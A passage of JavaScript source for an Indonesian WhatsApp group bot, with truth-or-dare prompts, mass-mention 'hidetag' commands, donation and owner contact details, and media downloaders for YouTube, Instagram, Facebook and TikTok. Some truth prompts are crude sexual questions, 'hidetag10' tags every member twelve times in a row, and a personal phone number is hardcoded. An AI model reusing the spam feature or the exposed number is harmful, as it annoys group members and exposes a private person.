if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const trut = ['Pernah coli atau colmek gak?', 'Pernah nonton bokep? kalau pernah berapa kali?', 'Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
let gmab = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
let tru = await surya.prepareMessage(from, gmab, image, {thumbnail: suryaImg})
const buttonstr = [{buttonId: 'truth', buttonText: {displayText: '➡️ Selanjutnya'}, type: 1}]
const buttonstrMessage = {
imageMessage: tru.message.imageMessage,
contentText: `*TRUTH*\n\n${ttrth}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttonstr,
headerType: 4
}

surya.sendMessage(from, buttonstrMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
break
case 'quotess':
if (isBan) return textImg(mess.OnlyBan)
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
//Flink(mess.wait)
let quot = await axios.get(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
//textImg(`${anu.data.result.quote}`)
let hehe = `${S}${quot.data.result.quote}${S}\n\n*_${quot.data.result.by}_*`
sendButMessage(from, hehe, `Silahkan Click Next Untuk Melanjutkan Nya`, [
{
buttonId: `${prefix}quotess`,
buttonText: {
displayText: `NEXT ➡️`,
},
type: 1,
},
]);
break;
case 'dare':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤤 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
let dera = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
let dar = await surya.prepareMessage(from, dera, image, {thumbnail: suryaImg})
const buttonsder = [{buttonId: 'dare', buttonText: {displayText: '➡️ Selanjutnya'}, type: 1}]
const buttonsderMessage = {
imageMessage: dar.message.imageMessage,
contentText: `*DARE*\n\n${der}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttonsder,
headerType: 4
}

surya.sendMessage(from, buttonsderMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
break

case 'cekbapak':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
const bapak = [`Wah Mantap Lu Masih Punya Bapack
Pasti Bapack Nya Kuli :v
Awowkwokwwok
#CandaBos`, `Aowkwwo Disini Ada Yteam :v
Lu Yteam Bro? Awowkwowk
Sabar Bro Ga Punya Bapack
#Camda`, `Bjir Bapack Mu Ternyata Sudah Cemrai
Sedih Bro Gua Liatnya
Tapi Nih Tapi :v
Tetep Ae Lu Yteam Aowkwowkw Ngakak :v`, `Jangan #cekbapak Mulu Broo :v
Kasian Yang Yteam
Ntar Tersinggung Kan
Yahahaha Hayyuk By : ᴹᴿ᭄Suryaㄙ×፝֟͜×⁩`]
const cek = bapak[Math.floor(Math.random() * bapak.length)]
surya.sendMessage(from, cek, text, { quoted: msg })
break
case 'tagme':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
mentions(`@${sender.split("@")[0]}`, [sender], true)
break
case 'kontak':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (args.length < 2) return textImg(`Penggunaan ${command} nomor|nama`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} nomor|nama`)
if (isNaN(q.split("|")[0])) return textImg(`Penggunaan ${command} nomor|nama`)
surya.sendContact(from, q.split("|")[0], q.split("|")[1], msg)
break
case 'hidetag':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
//if (args.length < 2) return textImg(`Masukkan text`)
let arr = [];
for (let i of groupMembers){
arr.push(i.jid)
}
mentions(q, arr, false)
gameAdd(sender, glimit)
}
break
case 'hidetag10':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
//if (args.length < 2) return textImg(`Masukkan text`)
let tag = [];
for (let i of groupMembers){
tag.push(i.jid)
}
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
mentions(q, tag, false)
gameAdd(sender, glimit)
}
break

case 'sticktag': case 'stickertag':
if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}stickertag*`)
let encmediai = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let mediai = await surya.downloadMediaMessage(encmediai)
let surr = [];
for (let i of groupMembers){
surr.push(i.jid)
}
//mentions(mediai, surr, false)
surya.sendMessage(from, mediai, sticker, {"contextInfo": {mentionedJid: [surr]}, quoted: msg})

break
case 'limit': case 'ceklimit':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (mentioned.length !== 0){
textImg(`Limit : ${_prem.checkPremiumUser(mentioned[0], premium) ? 'Unlimited' : `${getLimit(mentioned[0], limitCount, limit)}/${limitCount}`}
Limit Game : ${cekGLimit(mentioned[0], gcount, glimit)}/${gcount}
Balance : $${getBalance(mentioned[0], balance)}

Kamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buygamelimit untuk membeli game limit`)
} else {
textImg(`Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}
Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}
Balance : $${getBalance(sender, balance)}

Kamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
}
break
case 'owner':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
surya.sendContact(from, '62895415497664@s.whatsapp.net.split("@")', 'ᴹᴿ᭄𝑺𝒖𝒓𝒚𝒂ㄙ×፝֟͜×⁩', floc)
surya.sendContact(from, Mecha.split("@")[0], `${MechaName}`, floc)
setTimeout( () => {
mentions(`Tuh @${sender.split('@')[0]}, Kontaknya Owner Aku
Jangan lupa di save ya ^_^`, [sender], true)
}, 1000)
break
case 'developer':
case 'author':
let ini_list = []
for (let i of Suryaa) {
const vname = surya.contacts[i] != undefined ? surya.contacts[i].vname || surya.contacts[i].notify : undefined
ini_list.push({
"disName": `Developer Mecha Botz`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;surya;;;\nFN:${vname ? `${vname}` : `${surya.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
surya.sendMessage(from, {
"disName": `Developer Mecha Botz`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: msg, contextInfo: { forwardingScore: 508, isForwarded: true }})
break
case 'ping':
case 'speed':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let timestamp = speed();
let latensi = speed() - timestamp
textImg(`*Speed :* ${latensi.toFixed(4)} Seconds`)
}
break
case 'donate': case 'donasi':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
reply(`
┌〔 *Donasi • Emoney* 〕
├ *Pulsa :* 0895415497664
├ *Dana :* 0895415497664
└──────────────`)
break
case 'sourcecode': case 'sc': case 'src':
if (isBan) return 
textImg(`Bot ini menggunakan sc :
https://github.com/Xinz-Team/XinzBot`)
break
case 'runtime': case 'rtm':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`*BOT INI TELAH AKTIF SELAMA :*

${runtime(process.uptime())}`)
break
case 'stats': 
case 'botstat':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let totalchat = await surya.chats.all()
let i = []
let giid = []
for (let mem of totalchat){
i.push(mem.jid)
}
for (let id of i){
if (id && id.includes('g.us')){
giid.push(id)
}
}
let timestampi = speed();
let latensii = speed() - timestampi
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = surya.user.phone
let anu = process.uptime()
let tesknya = `*Versi Whatsapp :* ${wa_version}
*Baterai :* ${baterai.baterai}%
*Charge :* ${baterai.cas === 'true' ? 'Ya' : 'Tidak'}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*MCC :* ${mcc}
*MNC :* ${mnc}
*Versi OS :* 10.1.0
*Merk HP :* ${device_manufacturer}
*Versi HP :* ${device_model}
*Group Chat :* ${giid.length}
*Personal Chat :* ${totalchat.length - giid.length}
*Total Chat :* ${totalchat.length}
*Speed :* ${latensii.toFixed(4)} Second
*Runtime :* ${runtime(anu)}`
reply(tesknya)
}
break
case 'ytmp4':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length === 1) return textImg(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
let isLinks2 = args[1].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return reply(mess.error.Iv)
try {
gameAdd(sender, glimit)
Flink(mess.wait)
ytv(args[1])
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 40000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
const captionsYtmp4 = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
sendFileFromUrl(from, thumb, captionsYtmp4, msg)
sendFileFromUrl(from, dl_link, '', msg)
limitAdd(sender, limit)
})
})
.catch((err) => textImg(`${err}`))
} catch (err) {
sendMess(Suryaa, 'Ytmp4 Error : ' + err)
console.log(color('[Ytmp4]', 'red'), err)
reply(mess.error.api)
}
}
break
case 'ytmp3':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length === 1) return textImg(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
let isLinks = args[1].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply(mess.error.Iv)
try {
gameAdd(sender, glimit)
Flink(mess.wait)
yta(args[1])
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 30000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}
\`\`\`▢ Ext : MP3
\`\`\`▢ Filesize : ${filesizeF}
\`\`\`▢ Link : ${a.data}
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
const captions = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
sendFileFromUrl(from, thumb, captions, msg)
sendFileFromUrl(from, dl_link, '', msg)
limitAdd(sender, limit)
})
})
.catch((err) => textImg(`${err}`))
} catch (err) {
sendMess(Suryaa, 'Ytmp3 Error : ' + err)
console.log(color('[Ytmp3]', 'red'), err)
reply(mess.error.api)
}
}
break
case 'playmp4':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length === 1) return textImg(`Kirim perintah *${prefix}playmp4 query*`)
try {
gameAdd(sender, glimit)
Flink(mess.wait)
let yut = await yts(q)
ytv(yut.videos[0].url)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 40000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
const captionisu = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ URL : ${yut.videos[0].url}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
sendFileFromUrl(from, thumb, captionisu, msg)
sendFileFromUrl(from, dl_link, '', msg)
limitAdd(sender, limit)
})
})
.catch((err) => textImg(`${err}`))
} catch (err) {
sendMess(Suryaa, 'PlayMp4 Error : ' + err)
console.log(color('[PlayMp4]', 'red'), err)
reply(mess.error.api)
}
}
break
case 'play': case 'putar': case 'playmp3':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length === 1) return textImg(`Kirim perintah *${prefix}play query*`)
try {
gameAdd(sender, glimit)
Flink(mess.wait)
let yut = await yts(q)
yta(yut.videos[0].url)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then((a) => {
if (Number(filesize) >= 30000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
const captionis = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ URL : ${yut.videos[0].url}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
sendFileFromUrl(from, thumb, captionis, msg)
sendFileFromUrl(from, dl_link, '', msg)
})
})
.catch((err) => textImg(`${err}`))
} catch (err) {
sendMess(Suryaa, 'PlayMp3 Error : ' + err)
console.log(color('[PlayMp3]', 'red'), err)
reply(mess.error.api)
gameAdd(sender, glimit)
}
}
break
case 'igdl2': 
case 'instagram2':
if (!q) return reply('Link IG nya mana? ')
if (!q.includes('instagram')) return reply(mess.error.Iv)
reply(mess.wait)
let anu2 = await igDownloader(`${q}`)
.then((data) => { sendFileFromUrl(from, data.result.link, data.result.desc, msg) })
.catch((err) => { reply(String(err)) })
break
case 'igdl':
case 'instagram':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length < 2) return textImg(`Kirim perintah *${prefix}ig* link ig`)
if (!isUrl(args[1]) && !args[1].includes('instagram.com')) return reply(mess.error.Iv)
Flink(mess.wait)
gameAdd(sender, glimit)
getPost(args[1].split('/')[4])
.then((res) => {
let { owner_user, post, date, capt } = res
let caption = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM MEDIA*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Owner : ${owner_user}\`\`\`
\`\`\`▢ Jumlah Media : ${post.length}\`\`\`
\`\`\`▢ Caption :${capt}\`\`\`

_Harap tunggu sebentar, media akan segera dikirim_`
sendMess(from, caption)
for (let i = 0; i < post.length; i++){
sendFileFromUrl(from, post[i].url)
}
limitAdd(sender, limit)
})
.catch((err) => {
sendMess(Suryaa, 'IG Download Error : ' + err)
console.log(color('[IG Download]', 'red'), err)
reply(mess.error.api)
})
}
break
case 'fb':
case 'fbdl':
case 'facebook':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length < 2) return textImg(`Kirim perintah *${prefix}fb* url`)
if (!isUrl(args[1]) && !args[1].includes('facebook.com')) return reply(mess.error.Iv)
Flink(mess.wait)
gameAdd(sender, glimit)
fbdl(args[1])
.then((res) => {
sendFileFromUrl(from, res.result.links[0].url)
})
.catch((err) => {
sendMess(Suryaa, 'FB Error : ' + err)
console.log(color('[FB]', 'red'), err)
reply(mess.error.api)
gameAdd(sender, glimit)
})
}
break
case 'yts':
case 'ytsearch':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (args.length < 2) return textImg(`Kirim perintah *${prefix}ytsearch* _query_`)
Flink(mess.wait)
gameAdd(sender, glimit)
yts(q)
.then((res) => {
let yt = res.videos
let txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE SEARCH*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
*Hasil Pencarian : ${q}*
`
for (let i = 0; i < 10; i++){
txt += `
─────────────────

\`\`\`▢ Judul : ${yt[i].title}
\`\`\`▢ ID : ${yt[i].videoId}
\`\`\`▢ Upload : ${yt[i].ago}
\`\`\`▢ Ditonton : ${yt[i].views}
\`\`\`▢ Duration : ${yt[i].timestamp}
\`\`\`▢ URL : ${yt[i].url}
`
}
sendFileFromUrl(from, yt[0].image, txt, msg)
limitAdd(sender, limit)
})
.catch((err) => {
sendMess(Suryaa, 'YT SEARCH Error : ' + err)
console.log(color('[YT SEARCH]', 'red'), err)
reply(mess.error.api)
})
}
break

case 'tiktokmp4': case 'tiktok':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q.includes('tiktok.com')) return reply(mess.error.Iv)
if (!q) return textImg('Linknya?')
reply(mess.wait)
hx.ttdownloader(q)
.then(result => {
const { wm, nowm, audio } = result
axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
.then(async (a) => {
let me = `*Link* : ${a.data}`
surya.sendMessage(from, {url:`${nowm}`}, video, {mimetype:'video/mp4', quoted:msg, caption: 'Success'})
})
})
.catch(e => console.log(e))
break

case 'igstalk2':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
